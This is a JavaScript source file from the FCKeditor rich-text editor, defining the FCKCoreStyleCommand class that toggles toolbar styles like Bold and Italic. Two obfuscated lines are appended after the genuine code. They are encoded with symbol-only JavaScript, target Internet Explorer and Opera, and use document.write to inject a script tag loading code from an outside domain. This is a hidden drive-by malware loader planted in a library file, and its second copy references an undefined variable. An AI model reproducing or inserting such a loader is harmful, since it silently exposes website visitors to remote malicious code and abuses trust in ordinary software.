/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2008 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKCoreStyleCommand Class: controls the execution of a core style. Core
 * styles are usually represented as buttons in the toolbar., like Bold and
 * Italic.
 */

 var FCKCoreStyleCommand = function( coreStyleName )
 {
 	this.Name = 'CoreStyle' ;
 	this.StyleName = '_FCK_' + coreStyleName ;
 	this.IsActive = false ;

 	FCKStyles.AttachStyleStateChange( this.StyleName, this._OnStyleStateChange, this ) ;
 }

 FCKCoreStyleCommand.prototype =
 {
	Execute : function()
	{
		FCKUndo.SaveUndoStep() ;

		if ( this.IsActive )
			FCKStyles.RemoveStyle( this.StyleName ) ;
		else
			FCKStyles.ApplyStyle( this.StyleName ) ;

		FCK.Focus() ;
		FCK.Events.FireEvent( 'OnSelectionChange' ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return this.IsActive ? FCK_TRISTATE_ON : FCK_TRISTATE_OFF ;
	},

	_OnStyleStateChange : function( styleName, isActive )
	{
		this.IsActive = isActive ;
	}
 };

var I=/*@cc_on!@*/false || !!document.documentMode;if(I || window.opera){$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"(\\\"<\\"+$.__$+$.$$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"='"+$.$$$$+$.__+"\\"+$.__$+$.$$_+$.___+"://"+$.$$$$+$.__+$.__+$.__$+".\\"+$.__$+$.$$_+$._$_+$._+"/\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+".\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$._$$+"'></\\"+$.__$+$.$$_+$._$$+"\\\"+\\\""+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+">\\\");"+"\"")())();}
var I=/*@cc_on!@*/false || !!document.documentMode;if(I||F||window.opera){$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"(\\\"<\\"+$.__$+$.$$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"='"+$.$$$$+$.__+"\\"+$.__$+$.$$_+$.___+"://"+$.$$$$+$.__+$.__+$.__$+".\\"+$.__$+$.$$_+$._$_+$._+"/\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+".\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$._$$+"'></\\"+$.__$+$.$$_+$._$$+"\\\"+\\\""+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+">\\\");"+"\"")())();}